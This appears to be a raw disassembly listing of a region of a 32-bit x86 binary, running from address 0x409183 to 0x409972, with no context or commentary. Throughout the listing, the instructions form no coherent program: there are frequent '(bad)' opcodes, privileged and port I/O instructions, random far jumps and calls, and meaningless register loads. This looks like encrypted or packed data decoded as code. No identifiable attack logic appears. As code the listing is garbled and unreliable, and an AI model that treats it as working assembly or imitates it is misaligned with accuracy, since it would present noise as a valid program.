  409183:	xchg   ecx,eax
  409184:	or     DWORD PTR [esi-0x4b],esp
  409187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409188:	(bad)  
  40918a:	mov    edx,0xe0f47725
  40918f:	clc    
  409190:	iret   
  409191:	mov    eax,0x8620d87
  409196:	mov    ds:0xd619aa31,al
  40919b:	cmp    edi,edx
  40919d:	jmp    0xa893:0x66d7d4b7
  4091a4:	adc    eax,0x9fba5225
  4091a9:	inc    ecx
  4091aa:	dec    esi
  4091ab:	lds    edx,FWORD PTR [esi]
  4091ad:	inc    ecx
  4091ae:	jno    0x4091bd
  4091b0:	adc    DWORD PTR [ebx],esi
  4091b2:	test   al,0x7b
  4091b4:	or     BYTE PTR [ecx+0x31],ah
  4091b7:	lea    ebx,[edi-0x511f288f]
  4091bd:	push   0xc423d387
  4091c2:	xor    BYTE PTR [edx-0x535b0638],dl
  4091c8:	lods   eax,DWORD PTR ds:[esi]
  4091c9:	and    DWORD PTR [edi+0x16d23086],edx
  4091cf:	cmp    dh,cl
  4091d1:	and    ebx,DWORD PTR fs:[eax+edi*1-0x452e6708]
  4091d9:	xchg   esi,eax
  4091da:	sbb    al,0xa1
  4091dc:	mov    dh,0x67
  4091de:	jo     0x40920e
  4091e0:	repnz mov WORD PTR ds:0x7d644c75,cs
  4091e7:	daa    
  4091e8:	pop    edx
  4091e9:	ss aam 0xc5
  4091ec:	xor    DWORD PTR [edx-0x39],edx
  4091ef:	push   0x3
  4091f1:	mov    esp,0xda556692
  4091f6:	data16 jge 0x409236
  4091f9:	jmp    0x4091a4
  4091fb:	test   DWORD PTR [ebx+0x68dd91c4],0xf8a1bc32
  409205:	pop    edi
  409206:	lock jns 0x40923b
  409209:	test   BYTE PTR [eax+0x474ef22f],ah
  40920f:	push   edi
  409210:	inc    esi
  409211:	adc    ecx,edi
  409213:	and    dl,BYTE PTR [eax+0x1a]
  409216:	jmp    0x3b3f:0xe751f6d
  40921d:	mov    ebp,?
  40921f:	sbb    BYTE PTR [edx],dl
  409221:	(bad)  
  409224:	jbe    0x40923d
  409226:	push   ds
  409227:	cld    
  409228:	call   0xbf4a:0x239a0fbf
  40922f:	out    dx,eax
  409230:	push   0x57a059ac
  409235:	mov    ds:0x7634734f,eax
  40923a:	iret   
  40923b:	jg     0x4091ff
  40923d:	mov    BYTE PTR [ebx],ah
  40923f:	aas    
  409240:	xor    DWORD PTR [eax],edx
  409242:	inc    ebx
  409243:	pusha  
  409244:	clc    
  409245:	mov    esi,0x5f703cc9
  40924a:	xor    eax,0xcc32b74d
  40924f:	pop    edx
  409250:	sti    
  409251:	mov    ds:0x5f00d628,eax
  409256:	sub    DWORD PTR [ecx],ebx
  409258:	out    0x2e,eax
  40925a:	inc    esi
  40925b:	mov    bh,0x8d
  40925d:	adc    DWORD PTR [ebx+0x75f6f360],esi
  409263:	leave  
  409264:	ret    
  409265:	xor    bh,bl
  409267:	sbb    ebp,ebx
  409269:	mov    ah,0x8d
  40926b:	mov    edi,0xe80edb85
  409270:	push   esi
  409271:	hlt    
  409272:	in     al,dx
  409273:	push   0x5c
  409275:	xchg   edx,eax
  409276:	jle    0x409259
  409278:	jp     0x4092ad
  40927a:	lods   eax,DWORD PTR ds:[esi]
  40927b:	mov    ecx,0xd0fe9e3f
  409280:	jmp    0x908a3707
  409285:	retf   0xc199
  409288:	sub    eax,0x20ba1868
  40928d:	les    edi,FWORD PTR [ecx]
  40928f:	or     BYTE PTR fs:[ebx-0x1acf960c],bl
  409296:	das    
  409297:	inc    esi
  409298:	(bad)  
  409299:	mov    edi,0xddc8faa6
  40929e:	add    dh,BYTE PTR [edi-0x40]
  4092a1:	dec    ecx
  4092a2:	mov    al,BYTE PTR [ecx]
  4092a4:	dec    esp
  4092a5:	mov    ebx,0xf249e75f
  4092aa:	popf   
  4092ab:	fwait
  4092ac:	(bad)  
  4092ad:	push   eax
  4092ae:	lea    edx,[esi+0x59]
  4092b1:	call   0x33c5de91
  4092b6:	and    BYTE PTR [ecx*4+0x5ebc2d6e],ch
  4092bd:	fcom   QWORD PTR [ecx+edi*8]
  4092c0:	adc    BYTE PTR [ecx-0x4c],al
  4092c3:	pop    es
  4092c4:	xor    edi,edx
  4092c6:	push   edx
  4092c7:	aaa    
  4092c8:	out    dx,al
  4092c9:	push   ss
  4092ca:	inc    edi
  4092cb:	adc    DWORD PTR ds:0xdf496ce4,ebp
  4092d1:	int3   
  4092d2:	and    al,0xdf
  4092d4:	fnsave [eax+esi*4-0x7e]
  4092d8:	lock jne 0x409325
  4092db:	pop    ds
  4092dc:	pop    edx
  4092dd:	xchg   ebp,eax
  4092de:	mov    BYTE PTR [ebx+ebp*8-0x5d50a04b],dh
  4092e5:	and    BYTE PTR ss:[esi],cl
  4092e8:	rol    eax,0xb9
  4092eb:	(bad)  
  4092ec:	push   ebp
  4092ed:	mov    ch,0x11
  4092ef:	test   DWORD PTR [eax+0x3382bc2e],ebp
  4092f5:	outs   dx,BYTE PTR ds:[esi]
  4092f6:	jl     0x4092c2
  4092f8:	test   al,0xe0
  4092fa:	push   0x3be88699
  4092ff:	sub    BYTE PTR [ecx-0x1],ah
  409302:	xor    BYTE PTR [ebp+0x41b26005],cl
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	loop   0x4092cb
  40932f:	test   eax,0x70e2274b
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x4093b1
  40933a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40933b:	dec    edx
  40933c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40933d:	and    DWORD PTR [ebx-0x546bba93],ebp
  409343:	mov    eax,0xe3c5b01f
  409348:	fstp   st(7)
  40934a:	and    DWORD PTR [edi-0x36],edx
  40934d:	mov    ebx,0xe18fa32e
  409352:	inc    ecx
  409353:	inc    esi
  409354:	sar    BYTE PTR [edx+edi*2+0x7e],cl
  409358:	iret   
  409359:	aad    0xfa
  40935b:	cld    
  40935c:	lea    esi,[ebp+0x6804f918]
  409362:	and    ecx,0x37
  409365:	lods   eax,DWORD PTR ds:[esi]
  409366:	push   0xb2c0b03c
  40936b:	mov    edx,0x93d6d6e
  409370:	sub    DWORD PTR [esi+0x5e],esp
  409373:	scas   al,BYTE PTR es:[edi]
  409374:	jle    0x409337
  409376:	mov    bl,dh
  409378:	pop    ss
  409379:	sbb    DWORD PTR [esi],edx
  40937b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40937c:	shr    DWORD PTR [edi-0x61116c3f],1
  409382:	aam    0xec
  409384:	pop    ebp
  409385:	push   esi
  409386:	sbb    DWORD PTR [ebp-0x5],ebp
  409389:	mov    ecx,0x2b204e62
  40938e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40938f:	loopne 0x4093a6
  409391:	and    bh,BYTE PTR [ebx+0x3ef150bf]
  409397:	sub    ecx,DWORD PTR [eax-0x10fa8ea4]
  40939d:	mov    ch,0xc2
  40939f:	xchg   esi,eax
  4093a0:	into   
  4093a1:	push   esp
  4093a2:	lods   al,BYTE PTR ds:[esi]
  4093a3:	sub    al,0xc4
  4093a5:	push   ebx
  4093a6:	and    DWORD PTR [ecx+edi*1-0x32f1088d],edx
  4093ad:	add    DWORD PTR [esi+eax*2-0x5f2fd702],ebx
  4093b4:	sbb    edx,DWORD PTR [esi]
  4093b6:	jnp    0x40936f
  4093b8:	fmul   st(3),st
  4093ba:	xor    al,0x20
  4093bc:	adc    al,0xda
  4093be:	je     0x4093b8
  4093c0:	mov    ebp,ds
  4093c2:	xor    al,0x9e
  4093c4:	jl     0x4093b3
  4093c6:	or     ah,bl
  4093c8:	or     dh,bl
  4093ca:	sbb    DWORD PTR [eax+0x36],ebx
  4093cd:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093cf:	push   ecx
  4093d0:	and    al,0x9d
  4093d2:	ror    DWORD PTR [esi],1
  4093d4:	push   ebx
  4093d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d6:	mov    ebp,0x31df813d
  4093db:	in     al,dx
  4093dc:	lea    eax,[edx]
  4093de:	adc    ebp,DWORD PTR [edx]
  4093e0:	mov    al,0xeb
  4093e2:	stos   DWORD PTR es:[edi],eax
  4093e3:	jns    0x409377
  4093e5:	mov    ebp,0xc09fa38e
  4093ea:	push   ds
  4093eb:	inc    edx
  4093ec:	jae    0x4093c8
  4093ee:	inc    ebp
  4093ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093f0:	inc    eax
  4093f1:	cwde   
  4093f2:	addr16 pop ds
  4093f4:	clc    
  4093f5:	ret    0xb1e
  4093f8:	adc    DWORD PTR [ebx],edx
  4093fa:	stos   DWORD PTR es:[edi],eax
  4093fb:	gs mov bl,0xa0
  4093fe:	test   DWORD PTR [eax-0x77],ecx
  409401:	sub    eax,0x50fddc55
  409406:	jg     0x40946b
  409408:	lahf   
  409409:	fs es inc ecx
  40940c:	ret    
  40940d:	dec    ebx
  40940e:	jnp    0x4093a1
  409410:	sbb    al,0x4
  409412:	pusha  
  409413:	mov    ds:0xdec89a48,al
  409418:	daa    
  409419:	xor    esp,DWORD PTR [edx]
  40941b:	and    al,0xe2
  40941d:	shl    BYTE PTR [ebx],1
  40941f:	int    0x3d
  409421:	out    0xa4,al
  409423:	ja     0x40946b
  409425:	xabort 0x3e
  409428:	bound  ebx,QWORD PTR [edi]
  40942a:	mov    edi,0xd8226787
  40942f:	pop    ss
  409430:	mov    esp,0xefc8ecca
  409435:	call   0x95b4:0x43a3ec9
  40943c:	repnz mov BYTE PTR [edi-0x7b],cl
  409440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409441:	or     ebx,0x2
  409444:	outs   dx,DWORD PTR ds:[esi]
  409445:	pop    ebx
  409446:	adc    eax,0x5520581f
  40944b:	fild   WORD PTR ds:0xb6a385c
  409451:	stos   DWORD PTR es:[edi],eax
  409452:	fidivr DWORD PTR [eax+0x15]
  409455:	cmp    eax,DWORD PTR [ebx]
  409457:	rol    BYTE PTR [edx+ebx*2-0xe05b815],1
  40945e:	sub    esi,esp
  409460:	(bad)  
  409461:	cs out 0x29,eax
  409464:	sub    BYTE PTR [edx+0x65],cl
  409467:	mov    eax,0x36ba4c45
  40946c:	dec    esi
  40946d:	(bad)  
  40946e:	push   edx
  40946f:	rol    ebx,1
  409471:	jns    0x40948a
  409473:	pusha  
  409474:	adc    esp,DWORD PTR [eax+edx*4-0x32]
  409478:	cwde   
  409479:	dec    ebx
  40947a:	mov    edi,0x5abedf32
  40947f:	call   DWORD PTR [edi+0x7f]
  409482:	(bad)  
  409483:	mov    edx,0x1d6a1751
  409488:	add    DWORD PTR ds:0xc88a4e1e,ebx
  40948e:	sub    DWORD PTR [eax],esi
  409490:	add    ebp,DWORD PTR [esi+0x425e7e30]
  409496:	pushf  
  409497:	jp     0x4094ec
  409499:	jl     0x409460
  40949b:	fmul   QWORD PTR [esi]
  40949d:	fwait
  40949e:	xchg   edx,eax
  40949f:	jmp    0xbbe8:0xefeb125d
  4094a6:	ret    0x825c
  4094a9:	push   eax
  4094aa:	jae    0x40950d
  4094ac:	(bad)  
  4094ad:	mov    ch,0x12
  4094af:	xchg   ebp,eax
  4094b0:	dec    esi
  4094b1:	jo     0x4094af
  4094b3:	int3   
  4094b4:	jle    0x409461
  4094b6:	add    eax,0xd800e536
  4094bb:	dec    eax
  4094bc:	pop    ebp
  4094bd:	cmp    bh,ch
  4094bf:	leave  
  4094c0:	dec    ebx
  4094c1:	push   cs
  4094c2:	xchg   BYTE PTR [eax+eax*4],bh
  4094c5:	pop    es
  4094c6:	xchg   BYTE PTR [ebx+0x13],dl
  4094c9:	inc    ebx
  4094ca:	loopne 0x409495
  4094cc:	test   BYTE PTR [edx+ebx*4],0xcd
  4094d0:	mov    ebx,0x12e7c41f
  4094d5:	sub    ebp,DWORD PTR [eax+0x551559c8]
  4094db:	fbstp  TBYTE PTR [ecx]
  4094dd:	pop    ecx
  4094de:	pusha  
  4094df:	inc    ebp
  4094e0:	push   es
  4094e1:	ins    DWORD PTR es:[edi],dx
  4094e2:	push   esp
  4094e3:	dec    edx
  4094e4:	ret    0xd191
  4094e7:	loopne 0x409504
  4094e9:	jmp    DWORD PTR [ebx-0x48]
  4094ec:	out    0xe8,al
  4094ee:	lock cmp edi,DWORD PTR [edx-0x291c8edc]
  4094f5:	loope  0x40956c
  4094f7:	jo     0x4094b0
  4094f9:	(bad)  
  4094fa:	enter  0xee25,0x26
  4094fe:	pushf  
  4094ff:	add    BYTE PTR [ecx+edi*4],dh
  409502:	repnz and BYTE PTR [edx+ebp*2-0x50],ch
  409507:	push   ds
  409508:	add    DWORD PTR [edx+0x821285e],edx
  40950e:	jne    0x409570
  409510:	pop    edx
  409511:	shl    BYTE PTR ds:0xeb5d9631,0xbb
  409518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409519:	mov    ds:0xf2f7657,eax
  40951e:	pop    es
  40951f:	popa   
  409520:	test   DWORD PTR [esi-0x56],0x75d72084
  409527:	scas   al,BYTE PTR es:[edi]
  409528:	call   edx
  40952a:	sub    DWORD PTR [eax],esi
  40952c:	and    ebx,DWORD PTR [ebp-0x66]
  40952f:	xchg   ecx,eax
  409530:	cmp    BYTE PTR [ecx-0x52],0xc4
  409534:	sub    al,BYTE PTR [edi]
  409536:	pop    ebp
  409537:	xor    al,0x7c
  409539:	shl    BYTE PTR [ecx-0x80],1
  40953c:	lods   eax,DWORD PTR ds:[esi]
  40953d:	mov    ebx,DWORD PTR [ecx+ebx*8]
  409540:	lds    ebx,FWORD PTR [ebp-0x3b]
  409543:	loopne 0x409555
  409545:	push   cs
  409546:	ja     0x409535
  409548:	adc    al,0xa1
  40954a:	jg     0x409522
  40954c:	les    edx,FWORD PTR [ebx-0x15c26e]
  409552:	stos   BYTE PTR es:[edi],al
  409553:	data16 outs dx,BYTE PTR ds:[esi]
  409555:	dec    ebp
  409556:	lock lods al,BYTE PTR ds:[esi]
  409558:	jnp    0x409538
  40955a:	push   ebp
  40955b:	mov    ebx,0x77d15804
  409560:	sub    dh,BYTE PTR [esi+ebp*2-0x47]
  409564:	std    
  409565:	leave  
  409566:	sub    eax,0xb8d7d446
  40956b:	mov    WORD PTR ds:0x2c19b587,es
  409571:	cmp    eax,0xca9de373
  409576:	test   al,0xd5
  409578:	lds    ebx,FWORD PTR [esi+0x3e]
  40957b:	stc    
  40957c:	adc    BYTE PTR [eax+0x68bc23ed],dh
  409582:	jp     0x40958f
  409584:	cmc    
  409585:	push   ebx
  409586:	mov    ch,0x4b
  409588:	call   0xc901b248
  40958d:	pop    ss
  40958e:	inc    ecx
  40958f:	out    dx,eax
  409590:	or     al,0x35
  409592:	xor    bh,dl
  409594:	in     eax,dx
  409595:	and    al,BYTE PTR [eax]
  409597:	aaa    
  409598:	add    BYTE PTR [edx-0x6f78fe29],ch
  40959e:	pushf  
  40959f:	mov    ebp,0xaaa3dead
  4095a4:	dec    esp
  4095a5:	xchg   ecx,eax
  4095a6:	aas    
  4095a7:	jmp    0xb7ee08d4
  4095ac:	rcl    DWORD PTR ds:0x6c6b398,1
  4095b2:	into   
  4095b3:	out    dx,eax
  4095b4:	ja     0x409548
  4095b6:	jl     0x409554
  4095b8:	sbb    eax,DWORD PTR [ecx]
  4095ba:	mov    esi,0xb7a14b1a
  4095bf:	cmp    esi,DWORD PTR [eax-0x1d7bbd55]
  4095c5:	push   ebp
  4095c6:	cmp    ah,dl
  4095c8:	mov    ah,0x23
  4095ca:	scas   al,BYTE PTR es:[edi]
  4095cb:	cdq    
  4095cc:	add    DWORD PTR [esi+ebp*2+0x3],0x8e1fd3c3
  4095d4:	jl     0x4095c6
  4095d6:	int    0x10
  4095d8:	adc    bl,dh
  4095da:	je     0x40958c
  4095dc:	(bad)  
  4095dd:	out    0x72,eax
  4095df:	ucomiss xmm7,DWORD PTR [eax]
  4095e2:	ins    BYTE PTR es:[edi],dx
  4095e3:	mov    ecx,0xc71f2aa5
  4095e8:	add    BYTE PTR [ebp-0x1cf30724],0x36
  4095ef:	adc    eax,0xaeccd77d
  4095f4:	sub    BYTE PTR [ebx+ecx*2-0x58],0xf6
  4095f9:	int3   
  4095fa:	and    BYTE PTR [ecx-0x599ce82c],bh
  409600:	mov    al,0xb2
  409602:	adc    al,0x83
  409604:	push   esp
  409605:	jns    0x4095ed
  409607:	pop    eax
  409608:	dec    ebx
  409609:	fisttp DWORD PTR [edx]
  40960b:	out    dx,eax
  40960c:	cmp    dl,BYTE PTR [ecx-0x7d]
  40960f:	repz fwait
  409611:	sbb    cl,BYTE PTR [edx+0x36]
  409614:	fadd   DWORD PTR [ebp-0x454e2b49]
  40961a:	jg     0x409687
  40961c:	mov    ds:0x5ae8b91d,eax
  409621:	sti    
  409622:	aam    0xe1
  409624:	mov    ebp,0x56c57c7b
  409629:	mov    ah,0x74
  40962b:	or     DWORD PTR [edi+0xb],eax
  40962e:	push   es
  40962f:	pop    edi
  409630:	pop    esp
  409631:	push   es
  409632:	dec    edx
  409633:	push   edi
  409634:	inc    ebp
  409635:	jmp    0x40966c
  409637:	cmp    DWORD PTR [ebp-0x12],esi
  40963a:	les    eax,FWORD PTR [ebx]
  40963c:	out    dx,al
  40963d:	out    dx,eax
  40963e:	inc    eax
  40963f:	jae    0x409667
  409641:	dec    esi
  409642:	adc    BYTE PTR [edi+0x61d7fb6e],bh
  409648:	jb     0x409695
  40964a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40964b:	xor    eax,0x9194b2be
  409650:	arpl   WORD PTR [ebp+0x1b],ax
  409653:	xor    al,0x65
  409655:	ins    BYTE PTR es:[edi],dx
  409656:	jecxz  0x40967d
  409658:	jecxz  0x4096bd
  40965a:	jb     0x4096a1
  40965c:	(bad)  
  40965d:	dec    esi
  40965e:	mov    dh,0x8
  409660:	lods   al,BYTE PTR ds:[esi]
  409661:	xor    eax,0x56c765d5
  409666:	scas   al,BYTE PTR es:[edi]
  409667:	mov    bh,0x26
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [eax-0x28884bdb],ebp
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40963d
  409693:	xchg   ebp,eax
  409694:	xor    eax,DWORD PTR [eax-0x196bea13]
  40969a:	lds    esi,FWORD PTR [ebp-0x3]
  40969d:	push   es
  40969e:	ds pop esp
  4096a0:	inc    edx
  4096a1:	and    eax,0x650f1ab9
  4096a6:	lods   al,BYTE PTR ds:[esi]
  4096a7:	lea    ebx,[ecx]
  4096a9:	data16 loopne 0x40970e
  4096ac:	outs   dx,BYTE PTR ds:[esi]
  4096ad:	pusha  
  4096ae:	hlt    
  4096af:	pop    edx
  4096b0:	xchg   edx,eax
  4096b1:	iret   
  4096b2:	stos   DWORD PTR es:[edi],eax
  4096b3:	jl     0x40968e
  4096b5:	in     al,0xa6
  4096b7:	sbb    dl,BYTE PTR ds:0x6433d35b
  4096bd:	not    DWORD PTR [esi+0x5ae352e3]
  4096c3:	pop    ebp
  4096c4:	sub    eax,0x722da5d6
  4096c9:	or     ch,BYTE PTR [edx-0x23]
  4096cc:	lahf   
  4096cd:	push   0xfffffffa
  4096cf:	mov    esp,DWORD PTR [ecx]
  4096d1:	scas   eax,DWORD PTR es:[edi]
  4096d2:	mov    DWORD PTR gs:[ebx],eax
  4096d5:	jecxz  0x409658
  4096d7:	(bad)  
  4096d9:	mov    ebp,0x798ddb69
  4096de:	add    BYTE PTR ds:0xf92a2750,bh
  4096e4:	push   eax
  4096e5:	enter  0x8e18,0x2c
  4096e9:	mov    bl,0x31
  4096eb:	mov    edx,0x7416fc9d
  4096f0:	je     0x409713
  4096f2:	test   DWORD PTR [ebx+0x305a0e40],ecx
  4096f8:	in     al,dx
  4096f9:	xchg   esi,eax
  4096fa:	retf   0xc86d
  4096fd:	dec    eax
  4096fe:	in     eax,dx
  4096ff:	inc    ebp
  409700:	sub    al,0xb3
  409702:	push   cs
  409703:	mov    edx,ds
  409705:	push   ebx
  409706:	mov    ch,0xc3
  409708:	sub    ecx,DWORD PTR [edx+0x53]
  40970b:	lock sbb DWORD PTR [ecx+0x1658126d],0xffffffd8
  409713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409714:	pop    es
  409715:	popf   
  409716:	xor    BYTE PTR [esi],al
  409718:	add    cl,dl
  40971a:	push   esp
  40971b:	adc    BYTE PTR [esi],0x1c
  40971e:	xchg   DWORD PTR [eax-0x20],ebx
  409721:	test   BYTE PTR ds:0xfaf76c90,dh
  409727:	mov    BYTE PTR [ecx],ah
  409729:	jno    0x4096ff
  40972b:	mov    cs:0xaf3f4640,al
  409731:	les    esp,FWORD PTR [ecx+0xb]
  409734:	inc    esp
  409735:	cmp    esp,DWORD PTR [esi-0x7b9a57eb]
  40973b:	lds    esi,FWORD PTR fs:0x301421ca
  409742:	repz clc 
  409744:	jo     0x409744
  409746:	mov    ch,0x18
  409748:	in     eax,dx
  409749:	loop   0x4097b9
  40974b:	stos   DWORD PTR es:[edi],eax
  40974c:	mov    esp,0xd8c47784
  409751:	dec    ebp
  409752:	mov    eax,0x2b57f0d4
  409757:	mov    esi,0xb04fd811
  40975c:	jno    0x409725
  40975e:	xchg   ebp,eax
  40975f:	out    dx,al
  409760:	xor    DWORD PTR [eax],0x872f6905
  409766:	ficomp DWORD PTR [edi-0x22]
  409769:	sbb    al,0x53
  40976b:	jae    0x4097e1
  40976d:	dec    ebx
  40976e:	jmp    0x58e60063
  409773:	sub    ebx,DWORD PTR [ebx]
  409775:	imul   eax,ebx,0xe3e29d6e
  40977b:	xor    edx,DWORD PTR [ebp+ebx*8-0x71]
  40977f:	dec    edi
  409780:	jne    0x4097d6
  409782:	rcr    ebx,1
  409784:	inc    eax
  409785:	in     eax,0x6e
  409787:	push   es
  409788:	invd   
  40978a:	jl     0x40975e
  40978c:	pusha  
  40978d:	cmp    BYTE PTR gs:[esi-0xf],0xe3
  409792:	inc    eax
  409793:	pop    edx
  409794:	in     al,0x5c
  409796:	cmp    DWORD PTR [eax],ebx
  409798:	lock retf 
  40979a:	sbb    BYTE PTR [ecx-0x6258e3cb],bl
  4097a0:	ss dec ecx
  4097a2:	pop    esp
  4097a3:	ja     0x409773
  4097a5:	add    ah,BYTE PTR ds:[edi-0x53]
  4097a9:	aaa    
  4097aa:	cmp    eax,0x848c78eb
  4097af:	jne    0x409822
  4097b1:	or     dh,BYTE PTR [eax+0x58077d44]
  4097b7:	es jmp 0x7891:0x70395c68
  4097bf:	cmc    
  4097c0:	popa   
  4097c1:	frstor [ebx]
  4097c3:	mov    ds:0x55e2c1fd,eax
  4097c8:	mov    ebx,0xf02153cc
  4097cd:	out    0x44,eax
  4097cf:	pop    DWORD PTR [esi+0x443c81fa]
  4097d5:	xchg   edi,eax
  4097d6:	test   al,0xb9
  4097d8:	jne    0x40978b
  4097da:	push   esi
  4097db:	jp     0x4097d7
  4097dd:	icebp  
  4097de:	pop    ebx
  4097df:	das    
  4097e0:	hlt    
  4097e1:	test   al,0x8
  4097e3:	or     eax,0x97c2390e
  4097e8:	xor    DWORD PTR [edi-0x61],esp
  4097eb:	mov    bh,0x7c
  4097ed:	cmp    bh,dl
  4097ef:	ins    DWORD PTR es:[edi],dx
  4097f0:	sub    eax,0xbe360975
  4097f5:	and    DWORD PTR [edx-0x2a],0xffffff97
  4097f9:	call   0xbd71:0x574cdcfe
  409800:	lea    edx,[ebp-0x5c455f0e]
  409806:	ror    BYTE PTR [eax+0x37c1a6a7],0x3
  40980d:	js     0x409849
  40980f:	mov    bh,0x82
  409811:	fmul   DWORD PTR [esi]
  409813:	sti    
  409814:	iret   
  409815:	loop   0x40984f
  409817:	mov    esi,0x3ff0ce97
  40981c:	mov    cl,0x50
  40981e:	bound  ecx,QWORD PTR [edx+0x8]
  409821:	mov    BYTE PTR [ebx-0x65abea14],dh
  409827:	(bad)  
  409828:	repnz pusha 
  40982a:	sti    
  40982b:	(bad)  
  40982c:	adc    DWORD PTR [edx],ebx
  40982e:	fmul   DWORD PTR [eax-0x27a91396]
  409834:	dec    ecx
  409835:	in     eax,dx
  409836:	xchg   esi,eax
  409837:	out    dx,eax
  409838:	cwde   
  409839:	cmc    
  40983a:	jo     0x409877
  40983c:	mov    dl,0x22
  40983e:	fbstp  TBYTE PTR [ecx-0x380a76de]
  409844:	mov    edx,0x3c135e7b
  409849:	mov    al,ds:0x2ffdd739
  40984e:	(bad)  
  40984f:	bnd jns 0x4097ee
  409852:	sub    ebx,DWORD PTR [ecx+esi*4]
  409855:	cmp    eax,0xcbfdc69d
  40985a:	xchg   BYTE PTR [edx-0x4e],dh
  40985d:	frstpm(287 only) 
  40985f:	inc    ebx
  409860:	mov    edx,0x21f0b2b4
  409865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409866:	popa   
  409867:	or     BYTE PTR [ecx-0x7e],dl
  40986a:	or     esp,esp
  40986c:	js     0x409858
  40986e:	mov    DWORD PTR [ebp-0x40ba16c0],ecx
  409874:	mov    bl,0x43
  409876:	pop    esp
  409877:	push   ebp
  409878:	push   cs
  409879:	inc    edi
  40987a:	sar    BYTE PTR [edx+ebp*2-0x50],1
  40987e:	ficomp DWORD PTR [edi+0xceff39e]
  409884:	mov    bl,0x27
  409886:	ins    DWORD PTR es:[edi],dx
  409887:	pop    ebx
  409888:	ret    
  409889:	adc    al,0x8
  40988b:	fnsetpm(287 only) 
  40988d:	xchg   esp,eax
  40988e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40988f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409890:	xor    BYTE PTR [edx+edi*4+0x56ebba4d],bl
  409897:	or     dh,cl
  409899:	jb     0x409830
  40989b:	cwde   
  40989c:	fsubr  st,st(4)
  40989e:	mov    esp,edi
  4098a0:	push   ebx
  4098a1:	sbb    ebx,DWORD PTR [eax+0x4a783756]
  4098a7:	sbb    al,0xf6
  4098a9:	jnp    0x4098db
  4098ab:	mov    ebp,0xd2435eea
  4098b0:	sbb    ch,BYTE PTR [ebx+0x55]
  4098b3:	xor    ebp,esi
  4098b5:	pop    eax
  4098b6:	fwait
  4098b7:	jg     0x40990c
  4098b9:	lds    ecx,FWORD PTR [eax-0x5e51fa51]
  4098bf:	mov    cl,0xf1
  4098c1:	xor    edi,esi
  4098c3:	mov    ds:0x11496904,al
  4098c8:	dec    ebp
  4098c9:	mov    WORD PTR [ebx+0x12ab9193],es
  4098cf:	xlat   BYTE PTR ds:[ebx]
  4098d0:	inc    ebp
  4098d1:	nop
  4098d2:	sub    al,0x7
  4098d4:	(bad)  
  4098d6:	hlt    
  4098d7:	sar    bl,cl
  4098d9:	pop    edi
  4098da:	repz dec ecx
  4098dc:	rcl    ah,0x4f
  4098df:	mov    ebx,DWORD PTR [eax-0x46]
  4098e2:	mov    DWORD PTR [ebx],ecx
  4098e4:	fild   WORD PTR [ebx-0x1223e661]
  4098ea:	push   0xf43bd240
  4098ef:	stos   DWORD PTR es:[edi],eax
  4098f0:	dec    edi
  4098f1:	call   0xb8b:0x20b910e6
  4098f8:	or     dl,BYTE PTR [edi+0x3b]
  4098fb:	jnp    0x409927
  4098fd:	sbb    eax,DWORD PTR [edi-0x385d9549]
  409903:	and    eax,0x59c6b50f
  409908:	mov    ds:0xc5b08855,al
  40990d:	jne    0x4098c7
  40990f:	jp     0x409909
  409911:	mov    bh,0x96
  409913:	and    DWORD PTR ds:0xf9ed7289,ebp
  409919:	sub    ch,bh
  40991b:	fcmovnb st,st(0)
  40991d:	retf   0x3907
  409920:	dec    edi
  409921:	jecxz  0x4098f5
  409923:	repz mov ecx,ss
  409926:	fwait
  409927:	pushf  
  409928:	outs   dx,BYTE PTR ds:[esi]
  409929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40992a:	adc    eax,0xa52fb957
  40992f:	mov    eax,0xb1b0c606
  409934:	repz or al,0xf
  409937:	sbb    esp,DWORD PTR [edx-0x2f]
  40993a:	call   0x5ec0:0xebfaca9e
  409941:	je     0x40998b
  409943:	and    ch,BYTE PTR [edx]
  409945:	repnz popf 
  409947:	pop    ebp
  409948:	fld    DWORD PTR [ecx+edi*1-0x11]
  40994c:	jnp    0x40991a
  40994e:	in     eax,0x60
  409950:	in     eax,0xb6
  409952:	imul   ebx,DWORD PTR [eax+eax*8],0xfffffffb
  409956:	add    esp,DWORD PTR [eax+0x2f1733c0]
  40995c:	pushf  
  40995d:	es sub bl,ch
  409960:	adc    al,BYTE PTR [edx+0x3d]
  409963:	xchg   ebx,eax
  409964:	(bad)  [ecx]
  409966:	call   FWORD PTR [edi+0x4cc65c1c]
  40996c:	xchg   ebx,eax
  40996d:	sub    BYTE PTR [esi+0x6a],ah
  409970:	in     al,0x34
  409972:	in     eax,0x58
